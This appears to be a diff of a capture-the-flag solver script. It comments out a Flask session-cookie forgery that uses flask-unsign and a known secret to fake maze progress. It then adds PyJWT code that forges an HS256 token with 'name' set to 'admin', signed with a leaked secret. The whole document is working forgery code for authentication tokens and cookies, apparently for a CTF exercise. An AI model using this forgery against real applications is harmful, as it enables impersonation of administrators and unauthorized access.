@@ -1,24 +1,24 @@
-import itertools
-import flask_unsign
-from flask_unsign.helpers import wordlist
-import requests as r
-import time
-import re
-import sys
-import os
-import time
+# import itertools
+# import flask_unsign
+# from flask_unsign.helpers import wordlist
+# import requests as r
+# import time
+# import re
+# import sys
+# import os
+# import time
 
-secret = "supersecretkey"
-d_cookie = "eyJjb21wbGV0ZWRfbWF6ZXMiOjAsInN0YXJ0X3RpbWUiOjE3NDM5MjU5NDAuMjA4NjAwM30.Z_IytA.3gQaVWLpEkm-FNR5DgRPl2EhDK4"
-e_cookie = (
-    "{'completed_mazes': 10, 'start_time': "
-    + str(time.time())
-    + "}"
-)
-# os.system('flask-unsign --unsign --cookie "{}"'.format(d_cookie))
-# os.system('flask-unsign --decode --cookie "{}"'.format(d_cookie))
-# os.system('flask-unsign --decode --cookie "{}" --secret "{}"'.format(d_cookie, secret))
-os.system('flask-unsign --sign --cookie "{}" --secret "{}"'.format(e_cookie, secret))
+# secret = "u_have_kn0w_what_f0rmat_i5"
+# d_cookie = "eyJjb21wbGV0ZWRfbWF6ZXMiOjAsInN0YXJ0X3RpbWUiOjE3NDM5MjU5NDAuMjA4NjAwM30.Z_IytA.3gQaVWLpEkm-FNR5DgRPl2EhDK4"
+# e_cookie = (
+#     "{'completed_mazes': 10, 'start_time': "
+#     + str(time.time())
+#     + "}"
+# )
+# # os.system('flask-unsign --unsign --cookie "{}"'.format(d_cookie))
+# # os.system('flask-unsign --decode --cookie "{}"'.format(d_cookie))
+# # os.system('flask-unsign --decode --cookie "{}" --secret "{}"'.format(d_cookie, secret))
+# os.system('flask-unsign --sign --cookie "{}" --secret "{}"'.format(e_cookie, secret))
 
 
 
@@ -77,3 +77,24 @@ os.system('flask-unsign --sign --cookie "{}" --secret "{}"'.format(e_cookie, sec
 
 # if __name__ == "__main__":
 #     main()
+
+
+import jwt              # pip install pyjwt
+import datetime
+
+secret  = "u_have_kn0w_what_f0rmat_i5"
+payload = {
+    "name":  "admin",                    # 想伪造的字段
+    "iat":   datetime.datetime.utcnow(), # 签发时间（可选）
+    "exp":   datetime.datetime.utcnow() + datetime.timedelta(hours=1)  # 失效时间（可选）
+}
+
+# 明确指定同服务器一致的算法
+token = jwt.encode(
+    payload,
+    key=secret,
+    algorithm="HS256",
+    headers={"typ": "JWT", "alg": "HS256"}   # 可省略，pyjwt 会自动生成
+)
+
+print(token)      # PyJWT 2.x 默认返回 str，1.x 返回 bytes
